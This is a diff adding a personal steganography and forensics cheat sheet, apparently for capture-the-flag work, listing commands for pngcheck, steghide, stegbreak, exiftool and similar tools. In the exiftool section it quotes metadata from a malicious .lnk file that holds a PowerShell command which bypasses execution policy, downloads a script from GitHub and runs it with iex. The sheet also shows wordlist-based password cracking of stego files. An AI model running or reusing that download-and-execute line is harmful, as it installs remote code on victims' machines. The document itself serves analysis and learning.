@@ -1,0 +1,50 @@
+### stega ###
+
+## png
+pngcheck -7cpstvvx file.png
+pngsplit file.png
+png-parser chunkit.png --crc --length
+png-parser chunkit.png --crc --length --data -o 0
+png-parser chunkit.png --crc --length --text -d
+
+## stegdetect
+stegdetect -t jopifa file.jpg
+stegdetect -t jopiFa file.jpg
+stegdetect -s 100 -t jopiFa file.jpg
+
+## steghide
+steghide extract -sf file.jpg
+steghide extract -sf file.bmp -xf out.txt
+steghide extract -sf file.wav
+
+## outguess
+outguess -k "almost" -r file.jpg out.txt
+
+## stegbreak
+stegbreak -r /usr/share/stegbreak/rules.ini -f /path/to/rockyou.txt -c file.jpg
+stegbreak -r /usr/share/stegbreak/rules.ini -f /path/to/rockyou.txt file.jph
+
+## exiftool
+# links: https://exiftool.org/examples.html
+
+exiftool file.jpg|svg|etc						# basic extract all metadata
+exiftool -a -b -W ./%f_%t%-c.%s -preview:all file.jpg
+
+# works on .lnk malware file
+exiftool file.lnk
+  Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+  Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+  Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
+  Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
+
+
+
+## other
+stegcracker file.jpg dict
+stegoveritas file
+/home/tristan/.gem/ruby/3.0.0/bin/zsteg -a file.png|bmp
+openstego
+java -mx40M Extract file.jpg -p passwd
+piet : https://www.bertnase.de/npiet/npiet-execute.php
+audacity / sonic-visualiser
+brainfuck debugger : https://www.iamcal.com/misc/bf_debug/
